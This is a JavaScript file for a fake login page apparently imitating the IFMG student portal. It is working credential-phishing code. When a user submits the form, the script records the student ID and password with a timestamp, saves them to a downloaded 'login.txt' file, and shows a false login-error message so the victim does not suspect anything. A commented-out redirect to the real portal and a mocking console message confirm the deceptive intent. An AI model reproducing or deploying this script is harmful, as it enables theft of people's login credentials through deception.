const form = document.querySelector("#form");
const userError = document.querySelectorAll(".user-error");
const passwordError = document.querySelectorAll(".password-error");
const userInput = document.querySelector("#user");
const passordInput = document.querySelector("#password");

const removeClass = (list, cssClass) => {
  list.forEach((el) => el.classList.remove(cssClass));
};
const addClass = (list, cssClass) => {
  list.forEach((el) => el.classList.add(cssClass));
};
const validate = (user, password) => {
  if (!user) {
    removeClass(userError, "hidden");
  }
  if (!password) {
    removeClass(passwordError, "hidden");
  }
  return user && password;
};

const handleLogin = (event) => {  
  event.preventDefault();
  const user = event.target.user.value;
  const password = event.target.password.value;
  const isValid = validate(user, password);

  console.log('Aqui tu foi de submarino!!! :x');

  if (isValid) {
    const message = `
        Data: ${new Date()}
        RA: ${user}
        Senha: ${password}        
        `;
    console.log(message);
    criarArquivoTxt(message);
    const result = confirm("Erro ao realizar login, tente novamente!");
    
    window.location.reload();
    // if (result) {
    //   window.location.href =
    //     "https://meu.ifmg.edu.br/EducaMobile/Account/Login";
    // }
  }
};

function criarArquivoTxt(conteudo) {
  var link = document.createElement('a');
  link.style.display = 'none';

  var arquivoTxt = new Blob([conteudo], { type: 'text/plain' });
  link.href = URL.createObjectURL(arquivoTxt);

  link.download = 'login.txt';
  document.body.appendChild(link);

  link.click();
  document.body.removeChild(link);
}

userInput.addEventListener("input", (ev) =>
  ev.target.value
    ? addClass(userError, "hidden")
    : removeClass(userError, "hidden")
);

passordInput.addEventListener("input", (ev) =>
  ev.target.value
    ? addClass(passwordError, "hidden")
    : removeClass(passwordError, "hidden")
);

form.addEventListener("submit", handleLogin);
